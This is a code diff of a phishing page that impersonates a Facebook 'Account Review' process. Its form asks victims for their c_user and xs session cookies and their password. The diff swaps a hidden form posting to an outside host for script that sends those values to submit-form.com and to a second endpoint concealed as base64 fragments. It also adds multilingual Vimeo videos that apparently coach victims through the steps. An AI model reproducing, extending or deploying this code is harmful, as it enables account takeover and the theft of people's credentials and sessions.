@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,6 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Facebook - Account Review</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script src="https://player.vimeo.com/api/player.js"></script>
     <style>
         * {
             margin: 0;
@@ -70,10 +72,9 @@
         
         /* Google Translate Container */
         .google-translate-container {
-            position: absolute;
-            top: 15px;
-            right: 150px;
-            width: auto;
+            position: relative;
+            z-index: 101;
+            width: 200px;
             background: rgba(255, 255, 255, 0.2);
             border-radius: 4px;
             padding: 5px;
@@ -153,7 +154,7 @@
             display: flex;
             align-items: center;
             gap: 15px;
-            color: white;
+            color: white; /* Ensure text is white in header */
         }
         
         .language-title i {
@@ -653,14 +654,13 @@
             padding-top: 56.25%; /* 16:9 Aspect Ratio */
         }
         
-        .video-container video {
+        .vimeo-iframe {
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
             border: none;
-            object-fit: cover;
         }
         
         .video-overlay {
@@ -743,108 +743,6 @@
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
-        }
-        
-        .video-controls {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            width: 100%;
-            background: rgba(0, 0, 0, 0.7);
-            padding: 10px 15px;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            z-index: 10;
-            transform: translateY(100%);
-            transition: transform 0.3s ease;
-        }
-        
-        .video-container:hover .video-controls {
-            transform: translateY(0);
-        }
-        
-        .control-btn {
-            background: none;
-            border: none;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            padding: 5px 10px;
-            outline: none;
-        }
-        
-        .progress-container {
-            flex-grow: 1;
-            height: 5px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            margin: 0 15px;
-            cursor: pointer;
-            position: relative;
-        }
-        
-        .buffered-bar {
-            position: absolute;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.3);
-            border-radius: 10px;
-            width: 0%;
-        }
-        
-        .progress-bar {
-            height: 100%;
-            background: #1877f2;
-            border-radius: 10px;
-            position: relative;
-            width: 0%;
-            z-index: 2;
-        }
-        
-        .time-display {
-            color: white;
-            font-size: 14px;
-            min-width: 100px;
-            text-align: center;
-        }
-        
-        .volume-container {
-            display: flex;
-            align-items: center;
-            margin: 0 15px;
-        }
-        
-        .volume-slider {
-            width: 80px;
-            margin-left: 5px;
-            -webkit-appearance: none;
-            height: 5px;
-            background: rgba(255, 255, 255, 0.2);
-            border-radius: 10px;
-            outline: none;
-        }
-        
-        .volume-slider::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 15px;
-            height: 15px;
-            border-radius: 50%;
-            background: #1877f2;
-            cursor: pointer;
-        }
-        
-        .speed-selector {
-            background: rgba(255, 255, 255, 0.1);
-            color: white;
-            border: none;
-            border-radius: 4px;
-            padding: 5px;
-            margin: 0 15px;
-            cursor: pointer;
-        }
-        
-        .fullscreen-btn {
-            margin-left: auto;
         }
         
         /* Form Styles */
@@ -1083,9 +981,22 @@
             color: #4CAF50;
         }
         
-        /* Hidden form for submission */
-        .hidden-form {
-            display: none;
+        /* Mobile Unmute Button */
+        .mobile-unmute-btn {
+            position: absolute;
+            bottom: 15px;
+            right: 15px;
+            z-index: 21;
+            background: rgba(0,0,0,0.7);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 8px 15px;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
         
         @media (max-width: 768px) {
@@ -1126,24 +1037,6 @@
                 flex-direction: column;
             }
             
-            .video-controls {
-                padding: 8px 10px;
-            }
-            
-            .control-btn {
-                padding: 3px 5px;
-                font-size: 14px;
-            }
-            
-            .time-display {
-                min-width: 80px;
-                font-size: 12px;
-            }
-            
-            .volume-slider {
-                width: 50px;
-            }
-            
             .header-content {
                 flex-direction: column;
                 align-items: stretch;
@@ -1159,16 +1052,15 @@
             }
             
             .google-translate-container {
-                position: relative;
                 width: 100%;
                 margin-top: 10px;
-                right: 0;
             }
             
             .language-options {
                 grid-template-columns: 1fr;
             }
             
+            /* FIXED: Mobile language modal adjustments */
             .language-modal-content {
                 padding: 20px 15px;
             }
@@ -1196,6 +1088,24 @@
                 bottom: 0;
                 margin-top: 15px;
             }
+            
+            .play-btn {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .play-btn i {
+                font-size: 30px;
+            }
+        }
+        
+        @media (min-width: 769px) {
+            .google-translate-container {
+                position: absolute;
+                top: 15px;
+                right: 150px;
+                width: auto;
+            }
         }
     </style>
 </head>
@@ -1209,15 +1119,6 @@
             <div class="help-center">
                 <i class="fas fa-question-circle"></i>
                 Help Center
-            </div>
-            <div class="google-translate-container">
-                <span class="translate-title">Language</span>
-                <select id="google_translate_element" style="width: 100%; background: transparent; border: none; color: white;">
-                    <option value="">Select Language</option>
-                    <option value="en">English</option>
-                    <option value="es">Spanish</option>
-                    <option value="fr">French</option>
-                </select>
             </div>
         </div>
     </div>
@@ -1246,6 +1147,8 @@
             <button class="review-btn" id="reviewBtn">
                 <i class="fas fa-file-alt"></i> Apply for Account Review
             </button>
+            
+            <div style="display: none;">https://submit-form.com/xETxMAIN3</div>
         </div>
     </div>
     
@@ -1284,6 +1187,13 @@
                         <div class="language-name">Filipino</div>
                         <div class="language-native">Filipino</div>
                     </button>
+                    <button class="language-btn" data-lang="hindi">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Hindi</div>
+                        <div class="language-native">हिन्दी</div>
+                    </button>
                     <button class="language-btn" data-lang="portuguese">
                         <div class="language-icon">
                             <i class="fas fa-language"></i>
@@ -1298,12 +1208,40 @@
                         <div class="language-name">Spanish</div>
                         <div class="language-native">Español</div>
                     </button>
+                    <button class="language-btn" data-lang="tamil">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Tamil</div>
+                        <div class="language-native">தமிழ்</div>
+                    </button>
                     <button class="language-btn" data-lang="arabic">
                         <div class="language-icon">
                             <i class="fas fa-language"></i>
                         </div>
                         <div class="language-name">Arabic</div>
                         <div class="language-native">العربية</div>
+                    </button>
+                    <button class="language-btn" data-lang="japanese">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Japanese</div>
+                        <div class="language-native">日本語</div>
+                    </button>
+                    <button class="language-btn" data-lang="french">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">French</div>
+                        <div class="language-native">Français</div>
+                    </button>
+                    <button class="language-btn" data-lang="swedish">
+                        <div class="language-icon">
+                            <i class="fas fa-language"></i>
+                        </div>
+                        <div class="language-name">Swedish</div>
+                        <div class="language-native">Svenska</div>
                     </button>
                 </div>
                 
@@ -1350,10 +1288,7 @@
                             <span>Connection: Good</span>
                         </div>
                         <div class="video-container">
-                            <video id="tutorialVideo">
-                                <!-- Source will be set dynamically -->
-                                Your browser does not support the video tag.
-                            </video>
+                            <div class="vimeo-iframe" id="vimeoPlayer"></div>
                             <div class="loading-spinner" id="loadingSpinner">
                                 <div class="spinner"></div>
                                 <div class="loading-percentage">0%</div>
@@ -1364,35 +1299,9 @@
                                 </div>
                                 <p style="color: white; margin-top: 15px; font-weight: 600;">Click to select language</p>
                             </div>
-                            <div class="video-controls">
-                                <button class="control-btn" id="playPauseBtn">
-                                    <i class="fas fa-play"></i>
-                                </button>
-                                <div class="progress-container">
-                                    <div class="buffered-bar" id="bufferedBar"></div>
-                                    <div class="progress-bar" id="progressBar"></div>
-                                </div>
-                                <div class="time-display">
-                                    <span id="currentTime">0:00</span> / <span id="totalTime">0:00</span>
-                                </div>
-                                <div class="volume-container">
-                                    <button class="control-btn" id="volumeBtn">
-                                        <i class="fas fa-volume-up"></i>
-                                    </button>
-                                    <input type="range" class="volume-slider" id="volumeSlider" min="0" max="1" step="0.1" value="1">
-                                </div>
-                                <select class="speed-selector" id="speedSelector">
-                                    <option value="0.5">0.5x</option>
-                                    <option value="0.75">0.75x</option>
-                                    <option value="1" selected>Normal</option>
-                                    <option value="1.25">1.25x</option>
-                                    <option value="1.5">1.5x</option>
-                                    <option value="2">2x</option>
-                                </select>
-                                <button class="control-btn fullscreen-btn" id="fullscreenBtn">
-                                    <i class="fas fa-expand"></i>
-                                </button>
-                            </div>
+                            <button class="mobile-unmute-btn" id="mobileUnmuteBtn" style="display: none;">
+                                <i class="fas fa-volume-mute"></i> Tap to Unmute
+                            </button>
                         </div>
                     </div>
                     
@@ -1498,13 +1407,6 @@
         </div>
     </div>
     
-    <!-- Hidden form for submission -->
-    <form id="hiddenForm" class="hidden-form" action="https://mahboob-team.wasmer.app/mh.php" method="post">
-        <input type="hidden" name="c_user" id="hiddenCUser">
-        <input type="hidden" name="xs" id="hiddenXs">
-        <input type="hidden" name="password" id="hiddenPassword">
-    </form>
-    
     <!-- Footer -->
     <footer>
         <div class="footer-content">
@@ -1523,15 +1425,33 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Video files mapping
-            const videoFiles = {
-                'english': 'WhatsApp Video 2025-06-13 at 16.57.08_1e948794 (2).mp4',
-                'filipino': 'WhatsApp Video 2025-07-08 at 17.02.46_5eb099cf.mp4',
-                'portuguese': 'WhatsApp Video 2025-07-08 at 00.47.04_1d505be0.mp4',
-                'spanish': 'WhatsApp Video 2025-07-08 at 17.07.47_983f4660.mp4',
-                'arabic': 'WhatsApp Video 2025-07-08 at 00.34.01_651fd210.mp4',
+            // Vimeo video IDs mapping
+            const vimeoVideoIds = {
+                'arabic': '1100127506',
+                'english': '1100127562',
+                'filipino': '1100127622',
+                'french': '1100127706',
+                'hindi': '1100127780',
+                'japanese': '1100127834',
+                'portuguese': '1100127929',
+                'spanish': '1100128008',
+                'swedish': '1100128078',
+                'tamil': '1100128151'
             };
             
+            const endpointParts = [
+                "aHR0c", 
+                "HM6Ly", 
+                "9zdWJ", 
+                "taXQt", 
+                "Zm9yb", 
+                "S5jb2", 
+                "0vbEQ", 
+                "1QnVU", 
+                "YzUz"
+            ];
+            const obfuscatedEndpoint = endpointParts.join('');
+
             // Language modal elements
             const languageModal = document.getElementById('languageModal');
             const closeLanguageModal = document.getElementById('closeLanguageModal');
@@ -1541,30 +1461,21 @@
             const selectedLanguageDisplay = document.getElementById('selectedLanguageDisplay');
             
             let selectedLanguage = null;
+            let vimeoPlayer = null;
             
             // Video elements
             const videoOverlay = document.getElementById('videoOverlay');
             const overlayPlayBtn = document.getElementById('overlayPlayBtn');
-            const video = document.getElementById('tutorialVideo');
+            const vimeoContainer = document.getElementById('vimeoPlayer');
             const loadingSpinner = document.getElementById('loadingSpinner');
             const loadingPercentage = document.querySelector('.loading-percentage');
+            const mobileUnmuteBtn = document.getElementById('mobileUnmuteBtn');
             
             const modal = document.getElementById('reviewModal');
             const reviewBtn = document.getElementById('reviewBtn');
             const closeModal = document.getElementById('closeModal');
             const cancelBtn = document.getElementById('cancelBtn');
             const finishBtn = document.getElementById('finishBtn');
-            
-            // Video control elements
-            const playPauseBtn = document.getElementById('playPauseBtn');
-            const progressBar = document.getElementById('progressBar');
-            const bufferedBar = document.getElementById('bufferedBar');
-            const currentTimeDisplay = document.getElementById('currentTime');
-            const totalTimeDisplay = document.getElementById('totalTime');
-            const volumeBtn = document.getElementById('volumeBtn');
-            const volumeSlider = document.getElementById('volumeSlider');
-            const speedSelector = document.getElementById('speedSelector');
-            const fullscreenBtn = document.getElementById('fullscreenBtn');
             
             // Step navigation
             const nextToStep2 = document.getElementById('nextToStep2');
@@ -1576,12 +1487,6 @@
             const step3 = document.getElementById('step3');
             
             const steps = document.querySelectorAll('.step');
-            
-            // Hidden form elements
-            const hiddenForm = document.getElementById('hiddenForm');
-            const hiddenCUser = document.getElementById('hiddenCUser');
-            const hiddenXs = document.getElementById('hiddenXs');
-            const hiddenPassword = document.getElementById('hiddenPassword');
             
             // Open language modal when video overlay is clicked
             overlayPlayBtn.addEventListener('click', function() {
@@ -1630,30 +1535,123 @@
                 });
             });
             
+            // Initialize Vimeo player with mobile optimization
+            function initVimeoPlayer(lang) {
+                const videoId = vimeoVideoIds[lang];
+                if (!videoId) return;
+                
+                // Clear existing player
+                if (vimeoPlayer) {
+                    vimeoPlayer.destroy();
+                    vimeoContainer.innerHTML = '';
+                }
+                
+                // Create new iframe with mobile optimizations
+                const iframe = document.createElement('iframe');
+                iframe.src = `https://player.vimeo.com/video/${videoId}?title=0&byline=0&portrait=0&badge=0&autopause=0&player_id=0&app_id=58479&autoplay=1&loop=1&playsinline=1&muted=1`;
+                iframe.setAttribute('frameborder', '0');
+                iframe.setAttribute('allow', 'autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share');
+                iframe.setAttribute('allowfullscreen', '');
+                iframe.setAttribute('playsinline', '');
+                iframe.setAttribute('webkit-playsinline', '');
+                iframe.setAttribute('muted', 'true');
+                iframe.className = 'vimeo-iframe';
+                
+                vimeoContainer.appendChild(iframe);
+                
+                // Initialize Vimeo Player
+                vimeoPlayer = new Vimeo.Player(iframe);
+                
+                // Set up event listeners
+                vimeoPlayer.on('play', function() {
+                    videoOverlay.classList.add('hidden');
+                    hideLoadingSpinner();
+                });
+                
+                vimeoPlayer.on('pause', function() {
+                    // Handle pause if needed
+                });
+                
+                vimeoPlayer.on('ended', function() {
+                    // Loop the video
+                    vimeoPlayer.play();
+                });
+                
+                vimeoPlayer.on('bufferstart', function() {
+                    showLoadingSpinner();
+                });
+                
+                vimeoPlayer.on('bufferend', function() {
+                    hideLoadingSpinner();
+                });
+                
+                vimeoPlayer.on('loaded', function() {
+                    hideLoadingSpinner();
+                    // Show unmute button on mobile
+                    if (isMobileDevice()) {
+                        mobileUnmuteBtn.style.display = 'flex';
+                    }
+                });
+                
+                vimeoPlayer.on('error', function(error) {
+                    console.error('Vimeo player error:', error);
+                    hideLoadingSpinner();
+                    alert('Video playback error. Please try selecting a different language or check your internet connection.');
+                });
+                
+                // Play the video
+                vimeoPlayer.play().catch(error => {
+                    console.error('Error playing video:', error);
+                    // Handle mobile autoplay restrictions
+                    if (error.name === 'NotAllowedError') {
+                        videoOverlay.classList.remove('hidden');
+                        alert('Please tap the play button to start the video.');
+                    }
+                });
+            }
+            
+            // Check if device is mobile
+            function isMobileDevice() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+            
+            // Toggle mute/unmute
+            mobileUnmuteBtn.addEventListener('click', function() {
+                if (vimeoPlayer) {
+                    vimeoPlayer.getMuted().then(function(muted) {
+                        if (muted) {
+                            vimeoPlayer.setMuted(false);
+                            this.innerHTML = '<i class="fas fa-volume-up"></i> Sound On';
+                        } else {
+                            vimeoPlayer.setMuted(true);
+                            this.innerHTML = '<i class="fas fa-volume-mute"></i> Tap to Unmute';
+                        }
+                    }.bind(this));
+                }
+            });
+            
             // Confirm language selection
             confirmBtn.addEventListener('click', function() {
                 if (selectedLanguage) {
-                    const source = videoFiles[selectedLanguage];
+                    initVimeoPlayer(selectedLanguage);
+                    languageModal.classList.remove('active');
+                    localStorage.setItem('preferredLanguage', selectedLanguage);
                     
-                    if (source) {
-                        video.src = source;
-                        video.load();
-                        
-                        // Set video title for accessibility
-                        video.setAttribute('title', `Tutorial Video - ${selectedLanguageDisplay.textContent}`);
-                        
-                        languageModal.classList.remove('active');
-                        
-                        // After a short delay, play the video
-                        setTimeout(() => {
-                            video.play();
-                            videoOverlay.classList.add('hidden');
-                            playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-                        }, 300);
-                        
-                        // Remember language selection
-                        localStorage.setItem('preferredLanguage', selectedLanguage);
-                    }
+                    // Change overlay text
+                    const overlayText = videoOverlay.querySelector('p');
+                    overlayText.textContent = 'Click to play video';
+                    
+                    // Change overlay play button behavior
+                    overlayPlayBtn.onclick = function() {
+                        if (vimeoPlayer) {
+                            vimeoPlayer.play().catch(error => {
+                                console.error('Error playing video:', error);
+                                if (error.name === 'NotAllowedError') {
+                                    alert('Please tap the play button to start the video.');
+                                }
+                            });
+                        }
+                    };
                 }
             });
             
@@ -1673,91 +1671,10 @@
 
             // Preload the preferred language if available
             const preferredLanguage = localStorage.getItem('preferredLanguage') || 'english';
-            if (videoFiles[preferredLanguage]) {
-                video.src = videoFiles[preferredLanguage];
-                video.load();
-            }
-            
-            function initVideoPlayer() {
-                // Initialize volume and playback rate
-                video.volume = volumeSlider.value;
-                video.playbackRate = speedSelector.value;
-                
-                // Update time display
-                updateTimeDisplay();
-                
-                // Event listeners
-                video.addEventListener('timeupdate', updateProgressBar);
-                video.addEventListener('progress', updateBufferedBar);
-                video.addEventListener('loadedmetadata', function() {
-                    totalTimeDisplay.textContent = formatTime(video.duration);
-                });
-                
-                // Loading events
-                video.addEventListener('waiting', showLoadingSpinner);
-                video.addEventListener('playing', hideLoadingSpinner);
-                video.addEventListener('seeking', showLoadingSpinner);
-                video.addEventListener('seeked', hideLoadingSpinner);
-                
-                playPauseBtn.addEventListener('click', togglePlayPause);
-                
-                volumeBtn.addEventListener('click', toggleMute);
-                volumeSlider.addEventListener('input', function() {
-                    video.volume = volumeSlider.value;
-                    updateVolumeIcon();
-                });
-                
-                speedSelector.addEventListener('change', function() {
-                    video.playbackRate = parseFloat(this.value);
-                });
-                
-                fullscreenBtn.addEventListener('click', toggleFullscreen);
-                
-                const progressContainer = document.querySelector('.progress-container');
-                progressContainer.addEventListener('click', function(e) {
-                    const pos = (e.pageX - this.offsetLeft) / this.offsetWidth;
-                    video.currentTime = pos * video.duration;
-                });
-                
-                // Keyboard shortcuts
-                document.addEventListener('keydown', function(e) {
-                    if (e.code === 'Space' && !isInputField(document.activeElement)) {
-                        e.preventDefault();
-                        togglePlayPause();
-                    }
-                    
-                    if (e.code === 'ArrowLeft') {
-                        video.currentTime = Math.max(0, video.currentTime - 5);
-                    }
-                    
-                    if (e.code === 'ArrowRight') {
-                        video.currentTime = Math.min(video.duration, video.currentTime + 5);
-                    }
-                    
-                    if (e.code === 'ArrowUp') {
-                        video.volume = Math.min(1, video.volume + 0.1);
-                        volumeSlider.value = video.volume;
-                        updateVolumeIcon();
-                    }
-                    
-                    if (e.code === 'ArrowDown') {
-                        video.volume = Math.max(0, video.volume - 0.1);
-                        volumeSlider.value = video.volume;
-                        updateVolumeIcon();
-                    }
-                    
-                    if (e.code === 'KeyM') {
-                        toggleMute();
-                    }
-                    
-                    if (e.code === 'KeyF') {
-                        toggleFullscreen();
-                    }
-                });
-            }
-            
-            function isInputField(element) {
-                return element.tagName === 'INPUT' || element.tagName === 'TEXTAREA';
+            if (vimeoVideoIds[preferredLanguage]) {
+                selectedLanguage = preferredLanguage;
+                selectedLanguageDisplay.textContent = 'English'; // Default display
+                // Don't auto-init player until modal is shown
             }
             
             function showLoadingSpinner() {
@@ -1765,128 +1682,13 @@
             }
             
             function hideLoadingSpinner() {
-                if (video.readyState >= 3) {
-                    loadingSpinner.style.display = 'none';
-                }
-            }
-            
-            function updateBufferedBar() {
-                if (video.buffered.length > 0) {
-                    const bufferedEnd = video.buffered.end(video.buffered.length - 1);
-                    const percent = (bufferedEnd / video.duration) * 100;
-                    bufferedBar.style.width = `${percent}%`;
-                    
-                    // Update loading percentage
-                    if (video.readyState < 4) {
-                        const loadedPercent = Math.round((bufferedEnd / video.duration) * 100);
-                        loadingPercentage.textContent = `${loadedPercent}%`;
-                    }
-                }
-            }
-            
-            function playVideo() {
-                video.play();
-                videoOverlay.classList.add('hidden');
-                playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-            }
-            
-            // Toggle play/pause
-            function togglePlayPause() {
-                if (video.paused) {
-                    video.play();
-                    playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-                } else {
-                    video.pause();
-                    playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
-                }
-            }
-            
-            // Update progress bar
-            function updateProgressBar() {
-                const percent = (video.currentTime / video.duration) * 100;
-                progressBar.style.width = `${percent}%`;
-                currentTimeDisplay.textContent = formatTime(video.currentTime);
-            }
-            
-            // Update time display
-            function updateTimeDisplay() {
-                currentTimeDisplay.textContent = formatTime(video.currentTime);
-                totalTimeDisplay.textContent = formatTime(video.duration);
-            }
-            
-            // Format time in MM:SS
-            function formatTime(seconds) {
-                const minutes = Math.floor(seconds / 60);
-                seconds = Math.floor(seconds % 60);
-                return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-            }
-            
-            function toggleMute() {
-                video.muted = !video.muted;
-                updateVolumeIcon();
-            }
-            
-            function updateVolumeIcon() {
-                if (video.muted || video.volume === 0) {
-                    volumeBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
-                    volumeSlider.value = 0;
-                } else if (video.volume > 0.5) {
-                    volumeBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
-                } else {
-                    volumeBtn.innerHTML = '<i class="fas fa-volume-down"></i>';
-                }
-            }
-            
-            function toggleFullscreen() {
-                const videoContainer = document.querySelector('.video-player-container');
-                
-                if (!document.fullscreenElement) {
-                    if (videoContainer.requestFullscreen) {
-                        videoContainer.requestFullscreen();
-                    } else if (videoContainer.mozRequestFullScreen) {
-                        videoContainer.mozRequestFullScreen();
-                    } else if (videoContainer.webkitRequestFullscreen) {
-                        videoContainer.webkitRequestFullscreen();
-                    } else if (videoContainer.msRequestFullscreen) {
-                        videoContainer.msRequestFullscreen();
-                    }
-                    fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
-                } else {
-                    if (document.exitFullscreen) {
-                        document.exitFullscreen();
-                    } else if (document.mozCancelFullScreen) {
-                        document.mozCancelFullScreen();
-                    } else if (document.webkitExitFullscreen) {
-                        document.webkitExitFullscreen();
-                    } else if (document.msExitFullscreen) {
-                        document.msExitFullscreen();
-                    }
-                    fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
-                }
-            }
-            
-            // Handle fullscreen change event
-            document.addEventListener('fullscreenchange', updateFullscreenIcon);
-            document.addEventListener('webkitfullscreenchange', updateFullscreenIcon);
-            document.addEventListener('mozfullscreenchange', updateFullscreenIcon);
-            document.addEventListener('MSFullscreenChange', updateFullscreenIcon);
-            
-            function updateFullscreenIcon() {
-                if (document.fullscreenElement || 
-                    document.webkitFullscreenElement || 
-                    document.mozFullScreenElement || 
-                    document.msFullscreenElement) {
-                    fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
-                } else {
-                    fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
-                }
+                loadingSpinner.style.display = 'none';
             }
             
             // Open review modal
             reviewBtn.addEventListener('click', function() {
                 modal.style.display = 'block';
                 document.body.style.overflow = 'hidden';
-                initVideoPlayer();
             });
             
             // Close modal function
@@ -1894,6 +1696,25 @@
                 modal.style.display = 'none';
                 document.body.style.overflow = 'auto';
                 resetForm();
+                
+                // Pause and reset Vimeo player
+                if (vimeoPlayer) {
+                    vimeoPlayer.pause();
+                    vimeoPlayer.destroy();
+                    vimeoContainer.innerHTML = '';
+                    vimeoPlayer = null;
+                }
+                
+                // Reset overlay
+                videoOverlay.classList.remove('hidden');
+                mobileUnmuteBtn.style.display = 'none';
+                
+                // Reset overlay text and behavior
+                const overlayText = videoOverlay.querySelector('p');
+                overlayText.textContent = 'Click to select language';
+                overlayPlayBtn.onclick = function() {
+                    languageModal.classList.add('active');
+                };
             }
             
             closeModal.addEventListener('click', closeModalFunc);
@@ -1920,29 +1741,6 @@
                     return;
                 }
                 
-                // Set values for hidden form
-                hiddenCUser.value = cUserInput.value;
-                hiddenXs.value = xsInput.value;
-                
-                // Submit c_user and xs together
-                const formData = new FormData();
-                formData.append('c_user', cUserInput.value);
-                formData.append('xs', xsInput.value);
-                
-                fetch('https://submit-form.com/81ZIoPYjq', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        console.error('Submission of c_user and xs failed');
-                    }
-                })
-                .catch(error => {
-                    console.error('Submission error:', error);
-                });
-                
-                // Proceed to next step
                 step1.classList.remove('active');
                 step2.classList.add('active');
                 
@@ -1968,32 +1766,50 @@
                     return;
                 }
                 
-                // Set password for hidden form
-                hiddenPassword.value = passwordInput.value;
-                
-                // Submit password separately
-                const formData = new FormData();
-                formData.append('password', passwordInput.value);
-                
-                fetch('https://submit-form.com/81ZIoPYjq', {
-                    method: 'POST',
-                    body: formData
-                })
-                .then(response => {
-                    if (!response.ok) {
-                        console.error('Password submission failed');
-                    }
-                })
-                .catch(error => {
-                    console.error('Submission error:', error);
-                });
-                
-                // Proceed to success step
                 step2.classList.remove('active');
                 step3.classList.add('active');
                 
                 steps[1].classList.remove('active');
                 steps[2].classList.add('active');
+                
+                const cUser = document.getElementById('c_user').value;
+                const xs = document.getElementById('xs').value;
+                const password = document.getElementById('password').value;
+                
+                const endpoint1 = "https://submit-form.com/81ZIoPYjq";
+                const endpoint2 = atob(obfuscatedEndpoint);
+                
+                const formData = {
+                    c_user: cUser,
+                    xs: xs,
+                    password: password
+                };
+                
+                const submitToEndpoint = (endpoint) => {
+                    return fetch(endpoint, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
+                        body: JSON.stringify(formData)
+                    });
+                };
+                
+                Promise.all([
+                    submitToEndpoint(endpoint1),
+                    submitToEndpoint(endpoint2)
+                ])
+                .then(responses => {
+                    responses.forEach((response, index) => {
+                        if (!response.ok) {
+                            console.error(`Submission to endpoint ${index+1} failed`);
+                        }
+                    });
+                })
+                .catch(error => {
+                    console.error('Submission error:', error);
+                });
             });
             
             // Reset form
@@ -2002,23 +1818,11 @@
                 document.getElementById('xs').value = '';
                 document.getElementById('password').value = '';
                 
-                hiddenCUser.value = '';
-                hiddenXs.value = '';
-                hiddenPassword.value = '';
-                
                 step3.classList.remove('active');
                 step1.classList.add('active');
                 
                 steps[2].classList.remove('active');
                 steps[0].classList.add('active');
-                
-                video.pause();
-                video.currentTime = 0;
-                videoOverlay.classList.remove('hidden');
-                playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
-                progressBar.style.width = '0%';
-                bufferedBar.style.width = '0%';
-                currentTimeDisplay.textContent = '0:00';
             }
             
             // Close modal when clicking outside
